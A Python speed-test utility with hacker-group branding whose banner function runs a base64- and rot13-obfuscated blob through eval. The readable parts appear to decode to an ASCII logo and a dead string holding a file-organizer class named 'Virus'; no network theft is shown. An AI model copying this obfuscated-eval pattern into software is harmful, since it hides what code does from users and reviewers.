# usr/bin/python
# scripted by samay 
# program by speedtest program
# cybok hackers 
# cybok wars 
# design: vaimpier ritik 
# testing ...

#------------------------------imports 
try:
   import os
   import random
   import sys
   from os import system,name
   from time import sleep
   import speedtest
except Exception as samay:
    try:
       _ = system('pip install speedtest-cli')
       _ = system('pip install speedtest')
       _ = system('python3 main.py')
    except:
        pass

#-------------------------------colors 
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[1;37m"
g = "\033[0;90m"
gg ="\033[1;32m"
y = r

#---------------------------------backend function
def back(samay):
    if samay=='Y' or samay=='y':
        return True
    elif samay=='N' or samay=='n':
        return False
    
#------------------------------clear function for windows and linux 
def clear():
    system('cls' if name=='nt' else 'clear')

#---------------------------------space function
def space():
    print('\n')

#----------------------------banner()
def banner():
    import base64, codecs
    magic = 'CicnJwoKZGVmIGJhbm5lcigpOgogICAgcHJpbnQobG9nbykKCmRlZiBzcGFjZSgpOgogICAgcHJpbnQoJ1xuJykKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tbW92ZSBmdW5jdGlvbiAKZGVmIG1vdmVwcm9ncmFtZmlsZShmb2xkZXIsZmlsZXMpOgogICAgZm9yIGkgaW4gZmlsZXM6CiAgICAgICAgb3MucmVwbGFjZShpLCBmIntmb2xkZXJ9L3tpfSIpCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1jcmVhdGluZyBmb2xkZXJzCmRlZiBzYW1heWZpbGUoZm9sZGVyKToKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhmb2xkZXIpOgogICAgICAgIG9zLm1ha2VkaXJzKGZvbGRlcikKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLW9iamVjdCBvcmllbnRlZCBwcm9ncmFtbWluZyAhIAoKY2xhc3MgVmlydXM6CiAgICBwcm9qZWN0ID0gJ0Rpc3BsYXkhJwogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIGJhbm5lcigpCiAgICAgICAgc3BhY2UoKQogICAgZGVmIERpc3BsYXkoc2VsZik6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQrIuKUlOKUgCIrRm9yZS5XSElURSsiWyAxIF0gQXV0b21hdGljYWxseSBBcnJhbmdlIEZpbGVzIDogIikKICAgICAgICBwcmludChGb3JlLlJFRCsi4pSU4pSAIitGb3JlLldISVRFKyJbIDIgXSBDdXN0b20gW2F2YWlsYWJsZSBzb29uXSA6ICIpCiAgICAgICAgcHJpbnQoRm9yZS5SRUQrIuKUlOKUgCIrRm9yZS5XSElURSsiWyAzIF0gVXBkYXRlIDogIikKICAgICAgICBwcmludChGb3JlLlJFRCsi4pSU4pSAIitGb3JlLldISVRFKyJbIDQgXSBFeGl0IDogIikKICAgICAgICAgICAKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBzYW1heSgpOgogICAgICAgIHNwYWNlKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgc2FtYXlfbGlzdCA9IG9zLmxpc3RkaXIoKQogICAgICAgICAgIHNhbWF5X2xpc3QucmVtb3ZlKCdXaW5jbGVhbmVyLnB5JykKICAgICAgICAgICBkaXNwbGF5ID0gaW50KGlucHV0KEZvcmUuUkVEKyLilJTilIAiK0ZvcmUuV0hJVEUrIkVudGVyIERlc2lyZSBPcHRpb246ICIrRm9yZS5SRUQpKSAgCiAgICAgICAgICAgaWYgZGlzcGxheT09MToKICAgICAgICAgICAgICAgc2FtYXlmaWxlKCJJbWFnZXMiKQogICAgICAgICAgICAgICBzYW1heWZpbGUoIlZpZG9lcyIpCiAgICAgICAgICAgICAgIHNhbWF5ZmlsZSgiRXhlLVJhcnMiKQogICAgICAgICAgICAgICBzYW1heWZpbGUoIkRvY3VtZW50cyIpCiAgICAgICAgICAgICAgIHNhbWF5ZmlsZSgiQXBrIikKICAgICAgICAgICAgICAgc2FtYXlmaWxlKCJNdXNpYyIpCiAgICAgICAgICAgICAgIHNhbWF5X3dyaXRlX2ltYWdlcyA9IFsnLnBuZycsJy5qcGcnLCcuanBlZycsJy5n'
    love = 'nJLaYPphZ2qjW10XVPNtVPNtVPNtVPNtVPNtp2SgLKysq3WcqTIsnJ5xMKttCFOonFOzo3VtnFOcovOmLJ1urI9fnKA0VTyzVT9mYaOuqTthp3OfnKEyrUDbnFyoZI0hoT93MKVbXFOcovOmLJ1urI93pzy0MI9coJSaMKAqPvNtVPNtVPNtVPNtVPNtVUAuoJS5K3qlnKEyK3McMTIiplN9VSfaYz1jAPpfWl53MJWgWljaYz1eqvpfWl5zoULaYPphLKMcW10XVPNtVPNtVPNtVPNtVPNtp2SgLKysq3WcqTIsqzyxMJ9snJ5xMKttCFOonFOzo3VtnFOcovOmLJ1urI9fnKA0VTyzVT9mYaOuqTthp3OfnKEyrUDbnFyoZI0hoT93MKVbXFOcovOmLJ1urI93pzy0MI92nJEyo3AqPvNtVPNtVPNtVPNtVPNtVUAuoJS5K3qlnKEyK2I4MKWupvN9VSfaYzI4MFpfWl5lLKVaYPphA3baYPphrzyjWljaYzqupvpfWl5arvpfWl5cp28aYPphrvpfWl5uL2HaYPphqTSlW10XVPNtVPNtVPNtVPNtVPNtp2SgLKysq3WcqTIsMKuyK2yhMTI4VQ0tJ2xtMz9lVTxtnJ4tp2SgLKysoTymqPOcMvOipl5jLKEbYaAjoTy0MKu0XTxcJmSqYzkiq2IlXPxtnJ4tp2SgLKysq3WcqTIsMKuypzSlKDbtVPNtVPNtVPNtVPNtVPOmLJ1urI93pzy0MI9xo2A1oJIhqUZtCFOoWl50rUDaYPphMT9wWljaYaOjqPpfWl5jpUE4WljaYaufp3taYPphpTEzWljaYzEiL3taYPphnUEgoPpfWl5jrFpfWl5wWljaYaObpPpfWl5dplqqPvNtVPNtVPNtVPNtVPNtVUAuoJS5K3qlnKEyK2EiL3IgMJ50p19znJkyVQ0tJ2xtMz9lVTxtnJ4tp2SgLKysoTymqPOcMvOipl5jLKEbYaAjoTy0MKu0XTxcJmSqYzkiq2IlXPxtnJ4tp2SgLKysq3WcqTIsMT9wqJ1yoaEmKDbtVPNtVPNtVPNtVPNtVPOmLJ1urI9upTftCFOoWl5upTfaKDbtVPNtVPNtVPNtVPNtVPOmLJ1urI9upTgsnJ5xMKttCFOonFOzo3VtnFOcovNtp2SgLKysoTymqPOcMvOipl5jLKEbYaAjoTy0MKu0XTxcJmSqYzkiq2IlXPxtnJ4tp2SgLKysLKOeKDbtVPNtVPNtVPNtVPNtVPOmLJ1urI9gqKAcLlN9VSfaYz1jZlpfWl5gpQEyMlpfWl53LKLaYPphoGEuWljaoKA2WljaoGEuW10XVPNtVPNtVPNtVPNtVPNtp2SgLKysoKImnJAsnJ5xMKttCFOonFOzo3VtnFOcovOmLJ1urI9fnKA0VTyzVT9mYaOuqTthp3OfnKEyrUDbnFyoZI0hoT93MKVbXFOcovOmLJ1urI9gqKAcL10XVPNtVPNtVPNtVPNtVPNtoJ92MKOlo2qlLJ1znJkyXPWRo2A1oJIhqUZvYPOmLJ1urI93pzy0MI9xo2A1oJIhqUAsMzyfMFxXVPNtVPNtVPNtVPNtVPNtoJ92MKOlo2qlLJ1znJkyXPWWoJSaMKZvYPOmLJ1urI93pzy0MI9cozEyrPxXVPNtVPNtVPNtVPNtVPNtoJ92MKOlo2qlLJ1znJkyXPWSrTHgHzSlplVfVUAuoJS5K3qlnKEyK2I4MI9cozEyrPxXVPNtVPNtVPNtVPNtVPNtoJ92MKOlo2qlLJ1znJkyXPWJnJEiMKZvYPOmLJ1urI93pzy0MI92'
    god = 'aWRlb19pbmRleCkKICAgICAgICAgICAgICAgbW92ZXByb2dyYW1maWxlKCJBcGsiLCBzYW1heV9hcGtfaW5kZXgpCiAgICAgICAgICAgICAgIG1vdmVwcm9ncmFtZmlsZSgiTXVzaWMiLCBzYW1heV9tdXNpY19pbmRleCkKCiAgICAgICAgICAgZWxpZiBkaXNwbGF5PT0yOgogICAgICAgICAgICAgICBzcGFjZSgpCiAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEKyLilJTilIAiK0ZvcmUuV0hJVEUrIkNvbWluZyBzb29uICEgIikKICAgICAgICAgICAgICAgc3BhY2UoKQogICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCsi4pSU4pSAIitGb3JlLldISVRFKyJFeGl0aW5nICIpCiAgICAgICAgICAgICAgIHNwYWNlKCkKICAgICAgICAgICAgICAgc3lzLmV4aXQoKQoKICAgICAgICAgICBlbGlmIGRpc3BsYXk9PTM6CiAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncHl0aG9uIHVwZGF0ZS5weScpCiAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICBzcGFjZSgpCiAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEKyLilJTilIAiK0ZvcmUuV0hJVEUrIkV4aXRpbmcgISAiKQogICAgICAgICAgICAgICBzcGFjZSgpCiAgICAgICAgICAgICAgIHNsZWVwKDEuMikKCiAgICAgICAgICAgIAoKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHN5c3RlbWNsZWFyKCkKICAgICAgICAgICAgYmFubmVyKCkKICAgICAgICAgICAgc3BhY2UoKQogICAgICAgICAgICBwcmludChGb3JlLlJFRCsi4pSU4pSAIitGb3JlLldISVRFKyJQbGVhc2UgVHlwZSBudW1iZXIgV2hpY2ggeW91IHdhbnQgdG8gY2hvb3NlIG5vdCBzdHJpbmcgISAiKQogICAgICAgICAgICBzcGFjZSgpCiAgICAgICAgICAgIHNsZWVwKDMuMCkKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICBvcy5zeXN0ZW0oJ3B5dGhvbiBXaW5jbGVhbmVyLnB5JykKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyB2YWltcGllcjoKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncHl0aG9uMyBXaW5jbGVhbmVyLnB5JykKICAgICAgICAgICAgZmluYWxseToKICAgICAgICAgICAgICAgIHBhc3MKICAgCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBzeXN0ZW1jbGVhcigpCiAgICBzYW1heSA9IFZpcnVzKCkKICAgIHNhbWF5LkRpc3BsYXkoKQogICAgc2FtYXkuc2FtYXkoKScnJwpwcmludCh5K3krIiAgICAgICAgICAgICAgICkgIikKcHJpbnQodyt5KyIgICAgICAgICAgICAgICgoICIpCnByaW50KHcreSsiICAgICAgICAgICAgICApIFwgIikKcHJpbnQodyt5KyIgICAgICAgICAgICAo'
    destiny = 'VPNtXFNvXFNXpUWcoaDbqlg5XlVtVPNtVPNtVPNtVPNbVPNcVPNcVPVcVNcjpzyhqPu3X3xeVvNtVPNtVPNtVPNtVPxtXPNtXPOpVPVcPaOlnJ50XUperFfvVPNtVPNtVPNtVPttVPNcWPNcVPNcVPVcPaOlnJ50XUperFfvVPNtVPNtVPNtVPtxWPNtXPOpVPNtXFNtVPNtVPNtVPNtVvxXpUWcoaDbqlgvXlVtVPNtKy5rKy4vX3peMlfvYUWNDRONDRONDRONMFjvX3peLvfvKy5rKy5rVPNt4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFNYlVcPaOlnJ50XUpeLvfvVPNtVPNtKy5rVvg3X2peVxONDRONDRONDRONDRONDRNvX3peLvfvKy5rVPNtVPVeqlgvXlWDnJ5aVPttHUWiVPxtYFO2MKWmnJ9hVQRhZPNtVPNtVPNtVPNtVPNtVPNtVPNiVvxXpUWcoaDbqlgaXlVtVPNtVPOpDRNiVvglXlVfBwb6YPVeqlgaXlWpYlVepvfvYQb6BvjvX3peMlfvKRONVPNtVPNtVPVeqlfv4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFN4cFNYlVcPaOlnJ50XUpeMlfvVPNtVPNiDRONsPVepvfvBwb6BwbvX3peMlfvsUjvX3VeVwb6Bwb6Vvg3X2peVakNDROpKPNtVPNtVvg3XlWOqKEbo3VtLaxtVvg5XlWNH2SgLKx4ZwHtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNiVvxXpUWcoaDbqlgaXlVtVPNtYlONDROpKPVepvfvWmb6BvpvX3peMlfvY1kpVvglXlVaBwb6WlVeqlgaXlViDRONVSkpVPNtVPVeqlfvITuyVTS1qTuipvOcplOho3DtpzImpT9hp2yvoTHtVPNtVPNtVPNtVPNtYlVcPaOlnJ50XUpeMlfvVPNtYlNtY0ONDRONDRNiY1kpKRONDRONDROpVPOpKPNtVPVeqlfvMz9lVTShrFOcp3A1MKZto3VtMTSgLJqyVPNtVPNtVPNtVPNtVPNtVPNiVvxXpUWcoaDbqlgaXlVtVPttVP8tVPqNDRONDQ09CG1NDRONDPptVSjtVPxtVPVeqlfvL2S1p2IxVTW5VUEbnKZtpUWiM3WuoFNtVPNtVPNtVPNtVPNtVPNtVP8vXDcjpzyhqPu3X2peVvNtVSjbVPNtVPNiVPNtVPNtVPNtVSjtVPNtVPxiVPVeVyjjZmAoZGfmZ20tVBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtBXHtP8vXDcjpzyhqPu3X2peVvNtVPNtKPNtVPttVPNtVPNtVPNtVPNcVPNtYlVcPaOlnJ50XUpeMlfvVPNtVPNtVPNtVSjtVPNtVPNtVPNtYlVeqlx='
    joy = '\x72\x6f\x74\x31\x33'
    trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
    eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))

#------------------------------------banners and options
clear()
banner()
space()
def options():
   print(r+"└─"+w+"\033[1;37m[ 1 ] All Test : ")
   print(r+"└─"+w+"\033[1;37m[ 2 ] Download Speed : ")
   print(r+"└─"+w+"\033[1;37m[ 3 ] Upload Speed : ")
options()
space()
#-------------------------object oriented programming
class Samay:
    def __init__(self,user_input):
        self.data = user_input
    def samayfunc(self):
        self.ajay = speedtest.Speedtest()
        if self.data==1:
            try:
                clear()
                banner()
                space()
                print(b+'|──────────────────────────────────────────────/'+r)
                print(gg+'|                  ALL TESTS                  /')
                print(b+'|────────────────────────────────────────────/'+gg)
                sleep(0.5)
                space()
                server = (r+"└─"+w+"Please Wait......")
                for i in server:
                    sys.stdout.write(i)
                    sys.stdout.flush()
                    sleep(0.1)
                space()
                #system('speedtest-cli --share')   
                system('speedtest-cli --simple')       
                space() 
                user_inputback = input(r+"└─"+w+f"\033[1;37mDo You Want to Test Again or Exit [y/n] : "+r)
                samay_ajay = back(user_inputback)
                if samay_ajay:
                    user_input = True
                    yamhackers = Samay(user_input)
                    clear()
                    banner()
                    space()
                    options()
                    yamhackers.samayfunc()
                else:
                    space()
                    print(r+"└─"+w+f"\033[1;37mExiting....... ")
                    space()
                    sys.exit()                  
            except:
                pass
        elif self.data==2:
            try:
                clear()
                banner()
                space()
                print(b+'|──────────────────────────────────────────────/'+r)
                print(gg+'|                  Download Speed             /')
                print(b+'|────────────────────────────────────────────/'+gg)
                space()
                server = (r+"└─"+w+"Please Wait......")
                for i in server:
                    sys.stdout.write(i)
                    sys.stdout.flush()
                    sleep(0.1)
                space()
                print(r+"└─"+w+f"\033[1;37mYour Exact Download Speed is "+r+f"{self.ajay.download()} Mbps")
                space()
                user_inputback = input(r+"└─"+w+f"\033[1;37mDo You Want to Test Again or Exit [y/n] : "+r)
                samay_ajay = back(user_inputback)
                if samay_ajay:
                    user_input = True
                    yamhackers = Samay(user_input)
                    clear()
                    banner()
                    space()
                    options()
                    yamhackers.samayfunc()
                else:
                    space()
                    print(r+"└─"+w+f"\033[1;37mExiting....... ")
                    space()
                    sys.exit()
            except:
                pass
        elif self.data==3:
            try:
                clear()
                banner()
                space()
                print(b+'|──────────────────────────────────────────────/'+r)
                print(gg+'|                  Upload Speed               /')
                print(b+'|────────────────────────────────────────────/'+gg)
                space()
                server = (r+"└─"+w+"Please Wait......")
                for i in server:
                    sys.stdout.write(i)
                    sys.stdout.flush()
                    sleep(0.1)
                space()
                print(r+"└─"+w+f"\033[1;37mYour Exact Upload Speed is "+r+f"{self.ajay.upload()} Mbps")
                space()
                user_inputback = input(r+"└─"+w+f"\033[1;37mDo You Want to Test Again or Exit [y/n] : "+r)
                samay_ajay = back(user_inputback)
                if samay_ajay:
                    user_input = True
                    yamhackers = Samay(user_input)
                    clear()
                    banner()
                    space()
                    options()
                    yamhackers.samayfunc()
                else:
                    space()
                    print(r+"└─"+w+f"\033[1;37mExiting....... ")
                    space()
                    sys.exit()
                
            except:
                pass
        else:
            sys.exit()


try:
    user_output = int(input(r+"└─"+w+"\033[1;37mEnter the Desire Option : "+r))
except:
    clear()
    banner()
    print(r+"└─"+w+"\033[1;37mEnter Number to choose ! Restart Program...")
    sys.exit()

if __name__ == '__main__':
   ajay = Samay(user_output)
   ajay.samayfunc()




